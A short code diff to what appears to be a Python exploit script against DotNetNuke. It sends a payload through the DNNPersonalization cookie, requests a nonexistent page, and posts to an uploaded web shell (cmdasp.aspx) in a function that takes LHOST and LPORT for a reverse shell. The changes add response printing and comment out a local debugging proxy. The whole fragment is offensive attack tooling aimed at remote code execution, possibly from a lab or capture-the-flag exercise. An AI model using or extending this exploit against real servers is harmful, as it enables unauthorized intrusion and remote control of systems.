@@ -37,9 +37,10 @@ def send_payload(ip, payload):
 	cookies = {
 		'DNNPersonalization': payload
 	}
-	target = f"http://{ip}/dotnetnuke/xxx"
+	target = f"http://{ip}/dotnetnuke/thispagedoesnotexist"
 
 	r = s.get(target,headers=headers,cookies=cookies)
+	print(r.text)
 	if r.status_code != 404:
 		print("An error occured sending the payload")
 		exit(0)
@@ -67,11 +68,11 @@ def send_shell(ip, LHOST, LPORT):
 	}
 	s.headers.update(headers)
 
-	proxies = {
-		'http': 'http://127.0.0.1:8080',
-		'https': 'http://127.0.0.1:8080'
-	}
-	s.proxies.update(proxies)
+	# proxies = {
+	# 	'http': 'http://127.0.0.1:8080',
+	# 	'https': 'http://127.0.0.1:8080'
+	# }
+	# s.proxies.update(proxies)
 	
 	target = f"http://{ip}/dotnetnuke/cmdasp.aspx"
 	data = {
